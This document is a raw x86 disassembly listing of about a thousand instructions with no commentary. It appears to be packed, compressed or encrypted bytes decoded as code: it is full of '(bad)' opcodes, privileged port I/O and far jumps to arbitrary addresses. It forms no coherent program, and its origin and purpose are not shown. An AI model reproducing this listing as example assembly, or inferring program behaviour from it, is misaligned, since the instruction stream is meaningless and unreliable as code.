  40fdce:	cmp    BYTE PTR ds:0x9dcfbbe8,ah
  40fdd4:	cmp    ebp,ebx
  40fdd6:	mov    bl,0x33
  40fdd8:	retf   
  40fdd9:	xor    BYTE PTR [ebp+0x40],dl
  40fddc:	in     al,0x9c
  40fdde:	cmp    BYTE PTR [eax-0x78a9e7ce],bh
  40fde4:	or     DWORD PTR [ebp+0x4e],edx
  40fde7:	outs   dx,DWORD PTR ds:[esi]
  40fde8:	das    
  40fde9:	pop    ds
  40fdea:	dec    ebx
  40fdeb:	arpl   WORD PTR [esi+0x5e8cbde6],bx
  40fdf1:	xchg   esp,eax
  40fdf2:	xor    DWORD PTR [esi],ebp
  40fdf4:	outs   dx,DWORD PTR ds:[esi]
  40fdf5:	loop   0x40fdd3
  40fdf7:	dec    ebp
  40fdf8:	pusha  
  40fdf9:	and    edi,DWORD PTR [eax-0x23]
  40fdfc:	mov    esp,0xc5783c69
  40fe01:	push   esp
  40fe02:	jae    0x40fe12
  40fe04:	lahf   
  40fe05:	push   edx
  40fe06:	cli    
  40fe07:	jecxz  0x40fe18
  40fe09:	mov    ch,0x58
  40fe0b:	dec    ebx
  40fe0c:	cwde   
  40fe0d:	dec    edx
  40fe0e:	mov    dl,dh
  40fe10:	ins    BYTE PTR es:[edi],dx
  40fe11:	pop    ebp
  40fe13:	(bad)  
  40fe14:	mov    bl,0x2e
  40fe16:	pop    ebp
  40fe17:	xchg   ecx,eax
  40fe18:	push   edx
  40fe19:	(bad)  
  40fe1a:	pop    eax
  40fe1b:	pusha  
  40fe1c:	jmp    0x801b66c3
  40fe21:	and    al,0x24
  40fe23:	fiadd  DWORD PTR [esi]
  40fe25:	mov    bl,0x5e
  40fe27:	lods   eax,DWORD PTR ds:[esi]
  40fe28:	test   DWORD PTR [ebx],ecx
  40fe2a:	cwde   
  40fe2b:	retf   
  40fe2c:	inc    eax
  40fe2d:	pop    edx
  40fe2e:	add    al,0x95
  40fe30:	in     al,dx
  40fe31:	mov    dl,0x34
  40fe33:	ret    
  40fe34:	stos   BYTE PTR es:[edi],al
  40fe35:	in     eax,dx
  40fe36:	popf   
  40fe37:	jae    0x40fe78
  40fe39:	into   
  40fe3a:	sbb    al,0x68
  40fe3c:	test   DWORD PTR ds:0x45e77393,edi
  40fe42:	add    edx,DWORD PTR ds:0xe0415997
  40fe48:	cmp    ch,0xda
  40fe4b:	inc    esi
  40fe4c:	mov    bh,0x9b
  40fe4e:	dec    esi
  40fe4f:	push   esi
  40fe50:	mov    eax,ds:0x638e350e
  40fe55:	(bad)  
  40fe56:	xor    bl,bl
  40fe58:	fadd   QWORD PTR [edx+0x17b451f6]
  40fe5e:	xlat   BYTE PTR ds:[ebx]
  40fe5f:	push   0xffffffe5
  40fe61:	outs   dx,BYTE PTR ds:[esi]
  40fe62:	shl    BYTE PTR [bp+si+0x4ad6],0xf8
  40fe68:	call   0x5cf661ad
  40fe6d:	mov    al,ds:0x958f3526
  40fe72:	(bad)  
  40fe74:	pop    ebp
  40fe75:	aad    0xc7
  40fe77:	fld    QWORD PTR cs:[ebp+0x2c]
  40fe7b:	test   DWORD PTR [eax-0x2ba1c940],edi
  40fe81:	pop    ebx
  40fe82:	xor    DWORD PTR [edx+esi*8-0x203f4c8b],0xc4251bfa
  40fe8d:	aas    
  40fe8e:	scas   al,BYTE PTR es:[edi]
  40fe8f:	shr    DWORD PTR [ecx-0x64],1
  40fe92:	inc    ebp
  40fe93:	mov    edx,0xa8cb29b0
  40fe98:	dec    edi
  40fe99:	dec    edi
  40fe9a:	ins    BYTE PTR es:[edi],dx
  40fe9b:	rol    BYTE PTR [ebx],1
  40fe9d:	es cld 
  40fe9f:	(bad)  
  40fea0:	mov    ebp,0x998769e0
  40fea5:	ret    
  40fea6:	test   eax,0x9d7e5847
  40feab:	dec    ecx
  40feac:	stos   BYTE PTR es:[edi],al
  40fead:	jmp    0xdfc8:0x5d50a7f9
  40feb4:	int3   
  40feb5:	lods   al,BYTE PTR ds:[esi]
  40feb6:	mov    DWORD PTR [edi-0x23],ebx
  40feb9:	icebp  
  40feba:	cmp    al,0xd8
  40febc:	retf   
  40febd:	push   esp
  40febe:	clc    
  40febf:	sbb    ah,BYTE PTR [edi+esi*2-0x5c]
  40fec3:	out    dx,eax
  40fec4:	mov    cl,0x7d
  40fec6:	mov    ds:0xe41bd685,al
  40fecb:	jl     0x40feb3
  40fecd:	xor    DWORD PTR [ecx],ecx
  40fecf:	xchg   ebx,eax
  40fed0:	dec    DWORD PTR ds:0xa4deb4b7
  40fed6:	inc    edi
  40fed7:	(bad)  
  40fed8:	clc    
  40fed9:	(bad)  
  40feda:	cmc    
  40fedb:	(bad)  
  40fedc:	in     al,dx
  40fedd:	fs fsubrp st(6),st
  40fee0:	pop    edx
  40fee1:	add    BYTE PTR [esi-0xc],bh
  40fee4:	and    DWORD PTR [esi-0x6a],ebx
  40fee7:	retw   0x28d
  40feeb:	shl    ebp,1
  40feed:	sub    edi,DWORD PTR ds:0x29e028f
  40fef3:	std    
  40fef4:	fild   QWORD PTR [ecx+0x71]
  40fef7:	or     DWORD PTR [esi+0x21beb3f5],esp
  40fefd:	stos   DWORD PTR es:[edi],eax
  40fefe:	cmp    ecx,DWORD PTR [ebx+0x2c468f2e]
  40ff04:	jge    0x40fee7
  40ff06:	add    cl,ah
  40ff08:	enter  0xa6ab,0xa
  40ff0c:	pop    ebx
  40ff0d:	and    BYTE PTR [ecx-0x30],ch
  40ff10:	mov    esp,DWORD PTR [eax]
  40ff12:	mov    ds:0x4e47b0bd,al
  40ff17:	lods   eax,DWORD PTR ds:[esi]
  40ff18:	icebp  
  40ff19:	rcl    DWORD PTR [ecx+0x3],1
  40ff1c:	push   eax
  40ff1d:	pusha  
  40ff1e:	jmp    0x4e374d8f
  40ff23:	pop    edx
  40ff24:	xchg   edi,eax
  40ff25:	cli    
  40ff26:	fnstsw WORD PTR [edi-0x5807dcdb]
  40ff2c:	rol    DWORD PTR [edx],cl
  40ff2e:	sub    BYTE PTR [ebp+0x2ae4ff2d],ah
  40ff34:	fcomp  QWORD PTR [eax+0x6a689dc8]
  40ff3a:	or     cl,al
  40ff3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff3d:	repz push 0x3e
  40ff40:	repz or BYTE PTR [ebp-0x65],cl
  40ff44:	popa   
  40ff45:	in     al,0x8d
  40ff47:	mov    al,ds:0x3e956cb2
  40ff4c:	inc    ebp
  40ff4d:	jo     0x40fee0
  40ff4f:	stc    
  40ff50:	dec    esp
  40ff51:	cmc    
  40ff52:	(bad)  
  40ff53:	cld    
  40ff54:	xor    eax,0xc8a4ef57
  40ff59:	xchg   DWORD PTR [eax+0x1d],edx
  40ff5c:	shr    DWORD PTR [eax+0x44c1a6b6],0x37
  40ff63:	fisttp WORD PTR [eax-0x5]
  40ff66:	lods   al,BYTE PTR ds:[esi]
  40ff67:	lods   eax,DWORD PTR ds:[esi]
  40ff68:	xor    al,bh
  40ff6a:	add    al,al
  40ff6c:	iret   
  40ff6d:	pop    ebp
  40ff6e:	add    al,0x65
  40ff70:	mov    ebp,0x630a3a50
  40ff75:	push   cs
  40ff76:	aas    
  40ff77:	leave  
  40ff78:	or     dh,BYTE PTR [ebp-0x5b]
  40ff7b:	dec    esp
  40ff7c:	inc    ecx
  40ff7d:	cmp    ebx,edx
  40ff7f:	jnp    0x40ff43
  40ff81:	push   ds
  40ff82:	daa    
  40ff83:	mov    ds:0xc66df999,al
  40ff88:	add    DWORD PTR [ebp-0x6c],ebp
  40ff8b:	sub    esp,DWORD PTR [ecx+0x11]
  40ff8e:	test   BYTE PTR [ecx],dl
  40ff90:	pusha  
  40ff91:	sbb    dh,ch
  40ff93:	dec    esi
  40ff94:	sbb    al,0x71
  40ff96:	push   es
  40ff97:	jle    0x40ffa0
  40ff99:	out    0xf0,eax
  40ff9b:	push   cs
  40ff9c:	sub    BYTE PTR [ebx-0x68],bh
  40ff9f:	rcr    BYTE PTR [esi-0x3fbc1681],cl
  40ffa5:	mov    edi,0xf21e2243
  40ffaa:	mov    al,0x2a
  40ffac:	dec    edx
  40ffad:	dec    edi
  40ffae:	scas   al,BYTE PTR es:[edi]
  40ffaf:	sbb    DWORD PTR [edx+0x19],0x89b6aefc
  40ffb6:	stos   DWORD PTR es:[edi],eax
  40ffb7:	xchg   edi,eax
  40ffb8:	cmp    bh,ah
  40ffba:	aam    0xc2
  40ffbc:	sub    esp,edx
  40ffbe:	aad    0x5d
  40ffc0:	xchg   esp,eax
  40ffc1:	push   ebx
  40ffc2:	call   0x3fae:0x4f628b66
  40ffc9:	push   ebp
  40ffca:	cld    
  40ffcb:	mov    dh,0xaf
  40ffcd:	stc    
  40ffce:	adc    BYTE PTR [edx-0x59],dh
  40ffd1:	cmp    DWORD PTR [ebx],ebp
  40ffd3:	sub    al,0x89
  40ffd5:	out    0x6d,eax
  40ffd7:	dec    ebx
  40ffd8:	das    
  40ffd9:	push   es
  40ffda:	test   al,0x22
  40ffdc:	div    DWORD PTR [eax-0x43364a55]
  40ffe2:	cdq    
  40ffe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffe4:	sbb    ch,BYTE PTR [eax-0x7b]
  40ffe7:	jns    0x40ffa1
  40ffe9:	dec    ebx
  40ffea:	stos   BYTE PTR es:[edi],al
  40ffeb:	mov    eax,ds:0x917573d3
  40fff0:	adc    ah,BYTE PTR [ecx-0x2e22e651]
  40fff6:	mov    dl,0x10
  40fff8:	pop    ds
  40fff9:	jl     0x40ffc6
  40fffb:	mov    cl,0xe5
  40fffd:	add    cl,BYTE PTR [ebx]
  40ffff:	les    esi,FWORD PTR [ebp-0x58]
  410002:	or     BYTE PTR [eax+0x2361e87b],ah
  410008:	dec    ecx
  410009:	jb     0x40ffd0
  41000b:	mov    bh,0x70
  41000d:	imul   ebx
  41000f:	and    edi,ebp
  410011:	ja     0x41002b
  410013:	jmp    0x4ef9:0x3c65fbb2
  41001a:	(bad)  
  41001b:	lock fst DWORD PTR [edi]
  41001e:	gs ins DWORD PTR es:[edi],dx
  410020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410021:	xchg   ecx,eax
  410022:	mov    ds:0xec7a5c83,eax
  410027:	xchg   esp,eax
  410028:	mov    edi,eax
  41002a:	dec    ebx
  41002b:	call   FWORD PTR [eax]
  41002d:	outs   dx,BYTE PTR ds:[esi]
  41002e:	imul   esi,DWORD PTR [ecx+0x44],0xfffffffc
  410032:	stos   DWORD PTR es:[edi],eax
  410033:	(bad)  
  410034:	out    dx,eax
  410035:	jg     0x41007b
  410037:	mov    bh,0x2f
  410039:	lods   al,BYTE PTR ds:[esi]
  41003a:	and    dh,ah
  41003c:	dec    esp
  41003d:	jl     0x40ffec
  41003f:	ret    
  410040:	aaa    
  410041:	push   es
  410042:	inc    eax
  410043:	cmc    
  410044:	ins    DWORD PTR es:[edi],dx
  410045:	pop    ebp
  410046:	cmp    esi,edi
  410048:	and    DWORD PTR [ebx],esp
  41004a:	fwait
  41004b:	pop    ebp
  41004c:	repz out dx,al
  41004e:	test   eax,0xc71277e8
  410053:	adc    bl,BYTE PTR [ecx-0x3f]
  410056:	aam    0x8b
  410058:	out    0xf1,al
  41005a:	or     edi,DWORD PTR [edi+0x27]
  41005d:	jb     0x410077
  41005f:	mov    bh,0x22
  410061:	inc    edi
  410062:	jl     0x4100e3
  410064:	mov    ebp,0xde69f78b
  410069:	(bad)  
  41006a:	mov    cl,0xda
  41006c:	inc    ebx
  41006d:	mov    al,ds:0x76b1992d
  410072:	adc    DWORD PTR [esi*8+0x77fac0fb],0xe09e5a0d
  41007d:	mov    esi,0xc015cb5e
  410082:	mov    ecx,0x7b019e47
  410087:	nop
  410088:	xchg   edx,eax
  410089:	pxor   mm2,QWORD PTR [edx]
  41008c:	push   edi
  41008d:	stos   DWORD PTR es:[edi],eax
  41008e:	jmp    0xf92e:0xd57419e5
  410095:	es or  eax,0x36701d45
  41009b:	pusha  
  41009c:	lahf   
  41009d:	mov    esp,0x423b8ee6
  4100a2:	pop    edi
  4100a3:	mov    ebx,0x971f1dd9
  4100a8:	sbb    al,cl
  4100aa:	mov    eax,0x7914e1c4
  4100af:	jns    0x410036
  4100b1:	stos   BYTE PTR es:[edi],al
  4100b2:	push   cs
  4100b3:	aam    0x7a
  4100b5:	lods   eax,DWORD PTR ds:[esi]
  4100b6:	call   0xc40d:0xcda49d43
  4100bd:	and    al,0xbb
  4100bf:	or     al,0x8
  4100c1:	jecxz  0x410072
  4100c3:	fwait
  4100c4:	out    0xf7,al
  4100c6:	jo     0x4100ad
  4100c8:	mov    dh,0xbd
  4100ca:	test   al,0x8a
  4100cc:	fcmovnu st,st(3)
  4100ce:	hlt    
  4100cf:	xchg   edx,eax
  4100d0:	(bad)  
  4100d1:	call   FWORD PTR [esi+0x6a046d6f]
  4100d7:	(bad)  
  4100d8:	cmp    eax,DWORD PTR [esi+0x17]
  4100db:	pop    ebp
  4100dc:	add    BYTE PTR ds:0x4f3d0beb,bh
  4100e2:	mov    ds:0xe24d567a,al
  4100e7:	rcl    DWORD PTR [ebx-0x66a508dd],cl
  4100ed:	pop    ds
  4100ee:	cmp    BYTE PTR [ecx],dh
  4100f0:	inc    ecx
  4100f1:	daa    
  4100f2:	and    eax,0xa48c2f04
  4100f7:	ficom  WORD PTR [eax+0x5e]
  4100fa:	iret   
  4100fb:	scas   al,BYTE PTR es:[edi]
  4100fc:	mov    WORD PTR [ebp-0x53],gs
  4100ff:	in     eax,0x3c
  410101:	retf   0x396b
  410104:	aad    0xa0
  410106:	out    dx,eax
  410107:	sub    DWORD PTR [esi+0x6a5c45fa],edx
  41010d:	adc    al,0x90
  41010f:	sti    
  410110:	call   0xedcb:0x336de7ab
  410117:	lahf   
  410118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410119:	cmp    BYTE PTR [ebx+eax*2-0x5d],dh
  41011d:	test   ebp,esp
  41011f:	fwait
  410120:	push   ss
  410121:	cmp    eax,0x8e1ecad2
  410126:	sbb    eax,0xc2f3c422
  41012b:	loope  0x410156
  41012d:	test   al,0x9
  41012f:	mov    DWORD PTR [edx],esi
  410131:	dec    edi
  410132:	adc    BYTE PTR [ecx+0x986fc44],0xb6
  410139:	out    0xe2,al
  41013b:	adc    esi,DWORD PTR [edx+0x1bcd8fab]
  410141:	scas   al,BYTE PTR es:[edi]
  410142:	dec    ecx
  410143:	imul   ebp,DWORD PTR [edx-0x4e],0x1e503b6e
  41014a:	mov    ecx,0x7c996320
  41014f:	inc    ebp
  410150:	xor    al,0x96
  410152:	xor    eax,0x593eb280
  410157:	jb     0x41015d
  410159:	(bad)  
  41015a:	outs   dx,BYTE PTR ds:[esi]
  41015b:	addr16 sti 
  41015d:	pop    ebp
  41015e:	outs   dx,DWORD PTR fs:[esi]
  410160:	adc    ch,dh
  410162:	rcr    DWORD PTR [edx+0x50],1
  410165:	inc    ebx
  410166:	mov    edx,0x340faae3
  41016b:	or     al,BYTE PTR [esi]
  41016d:	pop    ds
  41016e:	lea    esi,[ecx+0x3d4261d0]
  410174:	stos   BYTE PTR es:[edi],al
  410175:	mov    esi,0xf05413e6
  41017a:	fdivp  st(2),st
  41017c:	inc    edi
  41017d:	pop    es
  41017e:	sbb    DWORD PTR [ebx+eax*8-0x65],ecx
  410182:	ret    
  410183:	jo     0x4101d8
  410185:	bound  edx,QWORD PTR [esi-0x7273cc8c]
  41018b:	stos   BYTE PTR es:[edi],al
  41018c:	aad    0x8d
  41018e:	mov    al,ds:0x40d41295
  410193:	sbb    al,0x4
  410195:	mov    dl,0x25
  410197:	sbb    al,0x5a
  410199:	mov    edi,0x6db2b857
  41019e:	and    eax,DWORD PTR [eax+0x62]
  4101a1:	add    dh,ah
  4101a3:	push   esp
  4101a4:	adc    dl,dl
  4101a6:	scas   al,BYTE PTR es:[edi]
  4101a7:	ds call 0x160e:0xae2661e9
  4101af:	add    DWORD PTR [ebx+0x3b],edi
  4101b2:	or     eax,0xebe73a2b
  4101b7:	jns    0x4101c7
  4101b9:	add    al,0x3c
  4101bb:	aas    
  4101bc:	jbe    0x410198
  4101be:	(bad)  
  4101bf:	push   ds
  4101c0:	push   ebx
  4101c1:	dec    eax
  4101c2:	bound  ecx,QWORD PTR [esp+esi*4-0x77059290]
  4101c9:	ret    0x9dea
  4101cc:	into   
  4101cd:	mov    edi,0xb2be2550
  4101d2:	out    0x2a,eax
  4101d4:	(bad)  
  4101d6:	jbe    0x410220
  4101d8:	mov    dl,0x51
  4101da:	mov    eax,ds:0xc79b0ab5
  4101df:	dec    edx
  4101e0:	(bad)  
  4101e1:	pop    ss
  4101e2:	adc    bh,BYTE PTR es:0xed1ee33a
  4101e9:	pop    esi
  4101ea:	push   ds
  4101eb:	or     eax,0x96271d27
  4101f0:	pop    esi
  4101f1:	adc    al,0x31
  4101f3:	int    0xb8
  4101f5:	push   esi
  4101f6:	mov    esp,0x894d04f6
  4101fb:	inc    edi
  4101fc:	cli    
  4101fd:	adc    al,0xef
  4101ff:	hlt    
  410200:	push   edx
  410201:	aad    0xe2
  410203:	gs icebp 
  410205:	mov    ah,0x97
  410207:	pop    edx
  410208:	inc    esi
  410209:	xchg   cx,ax
  41020b:	cmp    BYTE PTR [ebx],al
  41020d:	xor    eax,0xe327d445
  410212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410213:	or     BYTE PTR [edi],dh
  410215:	dec    esp
  410216:	mov    esi,0xb7792cad
  41021b:	mov    al,BYTE PTR [ecx]
  41021d:	push   edi
  41021e:	add    al,0x84
  410220:	jno    0x410227
  410222:	dec    ebp
  410223:	or     BYTE PTR [ebx+0x36982dc1],al
  410229:	xor    DWORD PTR [edi],esi
  41022b:	add    DWORD PTR [ecx*8+0x41730fe4],ebx
  410232:	mov    ds:0x50cebf41,al
  410237:	mov    dh,0x51
  410239:	pop    ds
  41023a:	imul   edx,DWORD PTR [ecx-0x2b],0xffffffb2
  41023e:	xlat   BYTE PTR ds:[ebx]
  41023f:	pop    ss
  410240:	nop
  410241:	rcl    DWORD PTR [eax-0x37d9864c],0x66
  410248:	cld    
  410249:	jmp    0xc8ce1ab4
  41024e:	xor    BYTE PTR [edi],ch
  410250:	pop    ebp
  410251:	std    
  410252:	xchg   edi,eax
  410253:	cli    
  410254:	jg     0x41023d
  410256:	jno    0x410281
  410258:	add    BYTE PTR [eax-0x74d6dbfb],ah
  41025e:	xchg   ebp,eax
  41025f:	sti    
  410260:	retf   0x4d48
  410263:	and    al,0x29
  410265:	aam    0x93
  410267:	jns    0x4102cf
  410269:	pop    ss
  41026a:	sbb    DWORD PTR [esp+eax*1+0x5885cae3],edx
  410271:	dec    esi
  410272:	sbb    BYTE PTR [ecx-0x7d],0x6b
  410276:	dec    edx
  410277:	push   DWORD PTR [ebp+0x42732760]
  41027d:	ror    BYTE PTR [ebp+0x1d],0x72
  410281:	repnz (bad) 
  410283:	lahf   
  410284:	fmul   QWORD PTR [edx+eiz*8]
  410287:	mov    esp,0x39cd29b
  41028c:	mov    ecx,0x1e2e486b
  410291:	add    eax,0x37d8ff2b
  410296:	lea    edx,[esi+0x39]
  410299:	lods   eax,DWORD PTR ds:[esi]
  41029a:	test   BYTE PTR [esi],ah
  41029c:	rol    DWORD PTR ds:[eax+0x34],1
  4102a0:	jge    0x4102dd
  4102a2:	imul   ebp,DWORD PTR [ebx-0x75],0x5e8cac2
  4102a9:	sub    eax,ebp
  4102ab:	call   0xd5da0847
  4102b0:	push   edi
  4102b1:	pop    ebx
  4102b2:	cmc    
  4102b3:	dec    eax
  4102b4:	adc    DWORD PTR [edx],0xc2b3b503
  4102ba:	pop    ecx
  4102bb:	dec    esp
  4102bc:	cli    
  4102bd:	repnz add DWORD PTR [ebp+0x25c6df2f],edx
  4102c4:	sbb    eax,DWORD PTR [eax+ebx*8-0x7]
  4102c8:	inc    esp
  4102c9:	pop    edx
  4102ca:	cmp    BYTE PTR [eax],0x94
  4102cd:	sbb    al,0xc7
  4102cf:	(bad)  
  4102d0:	xchg   edx,eax
  4102d1:	jns    0x4102de
  4102d3:	push   edx
  4102d4:	xor    DWORD PTR [eax-0x524a9613],ebx
  4102da:	adc    al,0x52
  4102dc:	fs in  eax,0x7e
  4102df:	mov    edx,0x16608411
  4102e4:	lods   al,BYTE PTR ds:[esi]
  4102e5:	mov    eax,ds:0xbfeb0814
  4102ea:	popa   
  4102eb:	jb     0x41036b
  4102ed:	sbb    BYTE PTR ds:0x269d460b,0xb7
  4102f4:	xchg   edi,eax
  4102f5:	addr16 cmp ebx,ebp
  4102f8:	push   es
  4102f9:	mov    edi,0x7308c2c9
  4102fe:	cdq    
  4102ff:	daa    
  410300:	test   eax,0x39ef6596
  410305:	in     al,dx
  410306:	sub    al,0xc3
  410308:	and    eax,0xb61078f0
  41030d:	test   DWORD PTR [esi+0x78],ebx
  410310:	or     BYTE PTR [ebx-0x7b],0xa9
  410314:	jne    0x410351
  410316:	in     al,dx
  410317:	inc    edi
  410318:	mov    al,ds:0xb99f4abb
  41031d:	sub    al,0xc9
  41031f:	loope  0x4102ec
  410321:	ret    0x3d1d
  410324:	jae    0x41037b
  410326:	mov    ecx,0x5d09586d
  41032b:	jo     0x41036e
  41032d:	xchg   ecx,eax
  41032e:	xlat   BYTE PTR ds:[ebx]
  41032f:	push   ebp
  410330:	jno    0x41031d
  410332:	xchg   ebp,eax
  410333:	cmp    bh,ch
  410335:	mov    ebp,0x55cbf155
  41033a:	bound  edx,QWORD PTR ds:0xe90f0e76
  410340:	addr16 jns 0x410377
  410343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410344:	mov    al,0x8f
  410346:	ja     0x410321
  410348:	test   al,0x21
  41034a:	push   0x8a49e984
  41034f:	lods   al,BYTE PTR ss:[esi]
  410351:	aam    0xf8
  410353:	jp     0x4103d2
  410355:	mov    ebx,0x72033eda
  41035a:	out    dx,al
  41035b:	jle    0x4103bd
  41035d:	lock shl DWORD PTR [ecx+edx*2-0xe9833fb],1
  410365:	jg     0x4102f7
  410367:	test   eax,0x5967362d
  41036c:	mov    al,ds:0xbc3fbfe4
  410371:	cwde   
  410372:	or     ebx,DWORD PTR [edx]
  410374:	add    al,0xc1
  410376:	mov    ds:0xa09c16b1,eax
  41037b:	rcl    BYTE PTR [eax],cl
  41037d:	jae    0x4103c2
  41037f:	mov    ebx,0x6b8b616c
  410384:	xchg   ecx,eax
  410385:	and    al,0x63
  410387:	arpl   WORD PTR [edx+0x53],cx
  41038a:	das    
  41038b:	xor    eax,0x18d588aa
  410390:	add    ch,BYTE PTR [ecx-0x608df9c5]
  410396:	mov    ds:0x86a581c4,eax
  41039b:	jae    0x41035b
  41039d:	xchg   ah,ah
  41039f:	push   edi
  4103a0:	loopne 0x410345
  4103a2:	cli    
  4103a3:	dec    ebp
  4103a4:	push   0xffffffc9
  4103a6:	clc    
  4103a7:	popf   
  4103a8:	js     0x4103d1
  4103aa:	adc    BYTE PTR [esi+0x3b],0x76
  4103ae:	ret    0x5c57
  4103b1:	out    dx,eax
  4103b2:	aam    0xb6
  4103b4:	stc    
  4103b5:	rcl    esi,0xf
  4103b8:	icebp  
  4103b9:	out    dx,al
  4103ba:	imul   eax,esp,0x40
  4103bd:	xchg   edi,eax
  4103be:	sbb    DWORD PTR [esi-0x343966f2],esi
  4103c4:	arpl   WORD PTR [ebp+0x73ab7912],bx
  4103ca:	push   edi
  4103cb:	mov    eax,ds:0xf8491c8d
  4103d0:	add    al,0x71
  4103d2:	and    eax,0x4106892c
  4103d7:	inc    esp
  4103d8:	mov    ds:0xd7bf0a3,eax
  4103dd:	or     eax,0xc0e0db51
  4103e2:	jecxz  0x41044b
  4103e4:	aas    
  4103e5:	adc    BYTE PTR [ecx+0x57276564],bl
  4103eb:	and    al,0x41
  4103ed:	loope  0x410455
  4103ef:	mov    BYTE PTR [ecx-0x34],bl
  4103f2:	and    BYTE PTR [ecx],al
  4103f4:	test   DWORD PTR [edi-0x4c962f51],esp
  4103fa:	mov    ebx,0xebc161ad
  4103ff:	lods   eax,DWORD PTR ds:[esi]
  410400:	es add al,0x98
  410403:	(bad)  
  410404:	mov    al,ds:0x837797c6
  410409:	push   0xffffffc7
  41040b:	ss dec edi
  41040d:	pop    ss
  41040e:	out    0x7a,al
  410410:	pop    esi
  410411:	(bad)  
  410412:	cmp    al,0x65
  410414:	inc    ebx
  410415:	pop    ss
  410416:	aas    
  410417:	add    al,0x64
  410419:	in     al,dx
  41041a:	rcl    DWORD PTR [edx],cl
  41041c:	or     DWORD PTR [ebp+0x44706ab3],edx
  410422:	mov    ah,0x48
  410424:	dec    ebp
  410425:	pop    esp
  410426:	fcmovne st,st(3)
  410428:	push   es
  410429:	fcmovne st,st(6)
  41042b:	test   al,0x21
  41042d:	jl     0x410424
  41042f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410430:	mov    ebp,0x22546b2c
  410435:	int    0xa1
  410437:	dec    ebp
  410438:	xchg   DWORD PTR [ebp+0x191c5b6c],ebx
  41043e:	leave  
  41043f:	mov    dl,BYTE PTR [edi+0x47abb5a9]
  410445:	mov    esp,cs
  410447:	mov    ss,edx
  410449:	adc    DWORD PTR [edx-0x6d],esp
  41044c:	loope  0x41046a
  41044e:	ins    BYTE PTR es:[edi],dx
  41044f:	js     0x4104c1
  410451:	xchg   edx,eax
  410452:	sbb    edi,DWORD PTR [ecx+0x4]
  410455:	sub    bl,bh
  410457:	dec    edi
  410458:	mov    cs,WORD PTR ds:0xc4a206d
  41045e:	jnp    0x410470
  410460:	xor    BYTE PTR es:[ebx+0x7e6efef],dl
  410467:	out    0xfe,al
  410469:	dec    edx
  41046a:	mov    ebx,ss
  41046c:	or     DWORD PTR [ebp+0x4ad8cc20],0x46
  410473:	test   al,0x8a
  410475:	add    al,0x8a
  410477:	xor    BYTE PTR [edi+0x15],cl
  41047a:	test   al,0x2e
  41047c:	xor    ch,BYTE PTR [ebp-0x5297314]
  410482:	cli    
  410483:	mov    bh,0xee
  410485:	(bad)  
  410487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410488:	sbb    eax,0x32a85ecd
  41048d:	cmp    ch,BYTE PTR [esi+0x203f2593]
  410493:	xchg   edi,eax
  410494:	mov    al,ds:0xab31ee9d
  410499:	rcl    DWORD PTR [edi-0x4593e1d7],1
  41049f:	lock ret 
  4104a1:	jb     0x410512
  4104a3:	xchg   ebp,ebx
  4104a5:	ins    DWORD PTR es:[edi],dx
  4104a6:	mov    edx,0x8fd07621
  4104ab:	ja     0x410516
  4104ad:	or     ch,ah
  4104af:	mov    bl,0xcb
  4104b1:	jl     0x4104ce
  4104b3:	mov    esi,0x625f4757
  4104b8:	fistp  WORD PTR [ebp-0x89b8d80]
  4104be:	stos   DWORD PTR es:[edi],eax
  4104bf:	mov    edx,0x7fbecad0
  4104c4:	test   bl,bh
  4104c6:	mov    esp,0x961cf1d6
  4104cb:	cdq    
  4104cc:	pop    edx
  4104cd:	shl    ebx,0xc0
  4104d0:	xchg   edi,ebx
  4104d2:	fstp   TBYTE PTR [ebx+ecx*1+0x7489748c]
  4104d9:	sub    DWORD PTR ds:0x80004112,ebp
  4104df:	js     0x410504
  4104e1:	std    
  4104e2:	xchg   edi,eax
  4104e3:	cmp    edi,edx
  4104e5:	xchg   edi,eax
  4104e6:	retf   0x739d
  4104e9:	or     DWORD PTR [edx+0x1c],edi
  4104ec:	xchg   ebx,eax
  4104ed:	fdivr  DWORD PTR [esp+ebx*4-0x56]
  4104f1:	shl    DWORD PTR [ebp+0x4f],0x45
  4104f5:	mov    edx,0x4d4699f7
  4104fa:	stc    
  4104fb:	mov    ds:0xaeac9918,eax
  410500:	jno    0x41051a
  410502:	cdq    
  410503:	ret    0xbd7f
  410506:	fs jmp 0xbf8f:0x35f97ddb
  41050e:	xor    al,0x4b
  410510:	js     0x41053f
  410512:	(bad)  
  410513:	rol    BYTE PTR [ebp-0xb],1
  410516:	jae    0x410555
  410518:	out    dx,eax
  410519:	cmc    
  41051a:	sbb    bl,BYTE PTR [eax-0x7f4d2e47]
  410520:	das    
  410521:	push   cs
  410522:	in     al,0x18
  410524:	xor    bh,bh
  410526:	xchg   bl,cl
  410528:	jne    0x4104cc
  41052a:	pop    edi
  41052b:	xor    ch,BYTE PTR es:[ecx+edx*8+0x2a]
  410530:	ret    0x5c15
  410533:	and    BYTE PTR [ecx-0x52df8a3a],cl
  410539:	adc    ecx,DWORD PTR [esi-0x2c]
  41053c:	pop    ss
  41053d:	jge    0x410533
  41053f:	pop    edx
  410540:	dec    eax
  410541:	pushf  
  410542:	dec    ebx
  410543:	jnp    0x4104e0
  410545:	or     eax,0xd418dd3b
  41054a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41054c:	xor    eax,eax
  41054e:	jbe    0x4105ab
  410550:	mov    ebx,DWORD PTR ds:0x2a574fb7
  410556:	in     eax,dx
  410557:	xor    bl,0x13
  41055a:	cmp    al,0x1c
  41055c:	iret   
  41055d:	dec    ch
  41055f:	xor    BYTE PTR [ecx-0x74f116b1],bl
  410565:	cdq    
  410566:	add    DWORD PTR [ebx+0x21],esp
  410569:	pop    ecx
  41056a:	add    esp,esp
  41056c:	add    eax,0x21963079
  410571:	repz in al,dx
  410573:	sbb    edx,ebp
  410575:	or     al,0x54
  410577:	mov    eax,0x279a5188
  41057c:	fdiv   QWORD PTR [ecx]
  41057e:	mov    esp,0x4b8fbfac
  410583:	or     eax,0x71d5de71
  410588:	sub    dh,BYTE PTR [edi-0x5b]
  41058b:	mov    esi,0x196963d1
  410590:	push   edx
  410591:	call   0xdfc4:0x883ac4d9
